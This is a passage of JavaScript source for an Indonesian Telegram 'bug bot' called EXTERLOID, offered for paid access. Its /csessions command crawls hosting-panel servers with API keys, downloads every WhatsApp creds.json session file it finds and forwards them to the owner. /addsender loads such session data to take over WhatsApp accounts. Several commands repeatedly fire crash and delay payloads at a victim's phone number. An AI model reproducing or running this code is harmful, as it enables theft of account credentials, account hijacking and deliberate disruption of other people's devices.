    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kecantikan nya 💅');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Cek Cantik ${text}* 」°
┃
┊• Nama : ${text}
┊• Tingkat Kecantikan : ${pickRandom([
    '100% Cantik Banget 😍',
    '95% Cantik Natural 💖',
    '80% Manis Banget 😚',
    '60% Lumayan Cantik 😊',
    '40% Cantik Dalam Gelap 😂',
    '10% Butuh Filter Instagram 🤭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Kayak Bintang 🌟',
    'Menawan Banget 💫',
    'Biasa Tapi Nyenengin 💐',
    'Misterius dan Elegan 👑',
    'Lembut dan Anggun 🌸'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Senyumnya bikin leleh 😍',
    'Tatapan matanya adem banget 👁️',
    'Ramah dan manis 🍬',
    'Bikin orang jatuh cinta 💘',
    'Punya vibe princess 👑'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});
/*=========================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=========================================================================*/
bot.onText(/^\/cekid(\s|$)/i, async (msg) => {
const chatId = msg.chat.id;
const user = msg.from;
const text = `USERNAME : ${user.username ? '@' + user.username : 'Tidak ada'}
ID : <code>${chatId}</code>`;
bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'HTML',
        reply_to_message_id: msg.message_id
    });
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Csessions And Add Sender
bot.onText(/^\/csessions(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  const text = match[1];
  if (!text) return bot.sendMessage(chatId, '❌ Missing Input\nExample: `/csessions domain,plta,pltc`', { parse_mode: 'Markdown' });

  const args = text.split(',');
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc) return bot.sendMessage(chatId, '❌ Parameter tidak lengkap. Gunakan format: `/csessions domain,plta,pltc`', { parse_mode: 'Markdown' });

  await bot.sendMessage(chatId, '⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...', { parse_mode: 'Markdown' });

  // Helper: cek apakah item adalah direktori
  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return (
      a.type === 'dir' ||
      a.type === 'directory' ||
      a.mode === 'dir' ||
      a.mode === 'directory' ||
      a.mode === 'd' ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  // ~ Fungsi rekursif untuk mencari "sessions/creds.json"
  async function traverseAndFind(identifier, dir = '/') {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
      });

      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];

      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || '';
        const itemPath = (dir === '/' ? '' : dir) + '/' + name;
        const normalized = itemPath.replace(/\/+/g, '/');

        if (name.toLowerCase() === 'sessions' && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || '';
                const sfPath = (normalized === '/' ? '' : normalized) + '/' + sfName;
                if (sfName.toLowerCase() === 'creds.json') {
                  found.push({ path: sfPath.replace(/\/+/g, '/'), name: sfName });
                }
              }
            }
          } catch {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === '' ? '/' : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === 'creds.json') {
            found.push({ path: (dir === '/' ? '' : dir) + '/' + name, name });
          }
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  // Jalankan scan
  try {
    const res = await axios.get(`${domain.replace(/\/+$/, '')}/api/application/servers`, {
      headers: { Accept: 'application/json', Authorization: `Bearer ${plta}` },
    });

    const data = res.data;
    if (!data || !Array.isArray(data.data)) {
      return bot.sendMessage(chatId, '❌ Gagal ambil list server dari panel.');
    }

    let totalFound = 0;

    for (let srv of data.data) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || 'unknown';
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, '/');
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, '/').replace(/^\/?/, '/');

          await bot.sendMessage(chatId, `📁 Ditemukan creds.json di server ${name}\nPath: \`${filePath}\``, {
            parse_mode: 'Markdown',
          });

          try {
            // Ambil URL download file
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;

              // Download file creds.json
              const fileRes = await axios.get(url, { responseType: 'arraybuffer' });
              const buffer = Buffer.from(fileRes.data);

              // Kirim ke owner
              for (let oid of ownerIds) {
                try {
                  await bot.sendDocument(oid, buffer, {}, {
                    filename: `${name.replace(/\s+/g, '_')}_creds.json`,
                  });
                } catch (e) {
                  console.error(`Gagal kirim file creds.json ke owner ${oid}:`, e);
                }
              }
            } else {
              await bot.sendMessage(chatId, `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}.`);
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
            await bot.sendMessage(chatId, `❌ Error saat download file creds.json dari ${name}`);
          }
        }
      }
    }

    if (totalFound === 0) {
      await bot.sendMessage(chatId, '✅ Scan selesai. Tidak ditemukan creds.json di folder sessions pada server manapun.');
    } else {
      await bot.sendMessage(chatId, `✅ Scan selesai. Total file creds.json berhasil diunduh dan dikirim: ${totalFound}`);
    }
  } catch (err) {
    console.error('csessions Error:', err);
    await bot.sendMessage(chatId, '❌ Terjadi error saat scan.');
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/^\/addsender(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }

  const argsText = match[1];
  if (!argsText) {
    return bot.sendMessage(
      chatId,
      '❌ Kirim Isi Creds.JSON langsung setelah command.\nExample : /addsender {"creds":{...}}',
      { parse_mode: 'Markdown' }
    );
  }

  const sessionText = argsText.trim();

  try {
    // Cek validitas JSON
    JSON.parse(sessionText);

    const sessionName = 'sender_' + Date.now();
    const sessionPath = `./sessions/${sessionName}`;

    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    // Simpan JSON ke creds.json
    fs.writeFileSync(`${sessionPath}/creds.json`, sessionText);

    // Load session Baileys
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const newSock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
    });

    newSock.ev.on('creds.update', saveCreds);

    newSock.ev.on('connection.update', ({ connection }) => {
      if (connection === 'open') {
        bot.sendMessage(
          chatId,
          `✅ Sender *${sessionName}* berhasil terhubung ke WhatsApp!`,
          { parse_mode: 'Markdown' }
        );

        senders.push({ name: sessionName, sock: newSock });
      } else if (connection === 'close') {
        bot.sendMessage(chatId, `⚠️ Koneksi *${sessionName}* terputus.`, {
          parse_mode: 'Markdown',
        });
      }
    });
  } catch (err) {
    console.error('❌ Gagal load session:', err);
    bot.sendMessage(chatId, '❌ Session tidak valid. Pastikan isi JSON benar.');
  }
});

/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });

/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem ID 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem ID 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem ID 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${senderId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${senderId} Telah Di Tambahkan Ke Database Premium. ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${senderId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "<blockquote>EXTERLOID [ ⚚ ]</blockquote>\nList - Premium\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

  if (!isOwner(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${senderId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${senderId} telah di tambahkan ke database admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${senderId} is already an admin.`);
    }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} telah di hapus dari database  premium.`);
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} telah di hapus dari database admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});






















/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// ~ Case Bugs 1
bot.onText(/\/delayinvis (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Delay Invisible
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 150; i++) {
    await XStromDelaySw(target);
    await sleep(1000);
    await XStromDelayNative(target, false);
    await sleep(150);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Delay Invisible
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});




/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// ~ Case Bugs 2
bot.onText(/\/crashui (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Crash Ui
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await XStromUiCrash(target);
    await sleep(500);
    await XStromXCallCrash(target); 
    await sleep(1000);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    
    
    
     
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Crash Ui
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});




/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// ~ Case Bugs 3
bot.onText(/\/crashios (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Crash Ios
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await crashIosExtend(sock, target);
    await crashIosExtend(sock, target);
    await crashIosExtend(sock, target);
    await sleep(700);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    
    
    
    
    console.log(chalk.red.bold(`Succes Bug To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Crash Ios
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});




/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// ~ Case Bugs 4
bot.onText(/\/force (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Force
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await ZhTFoltra(sock, target);
    await ZhTFoltra(sock, target);
    await sleep(200);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    
    
    
    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Force
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
//case bug 5
bot.onText(/\/delayduration (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Delay Duration
ズ. Status : Process 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await XStromDelaySw(target);
    await XStromDelaySw(target);
    await sleep(1000);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await blankbyramz(target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await BlankKlick(sock, target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    await CrashkontolByramz(target);
    await sleep(100);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 𖣂 」 SendBug ˋ EXTERLOID</blockquote>

─────────────────
ズ. Target : ${target}
ズ. Type : Delay Duration
ズ. Status : Succes 
ズ. Date Now : ${date}
─────────────────
<code>© @ejaaskuy</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
//case bug 6
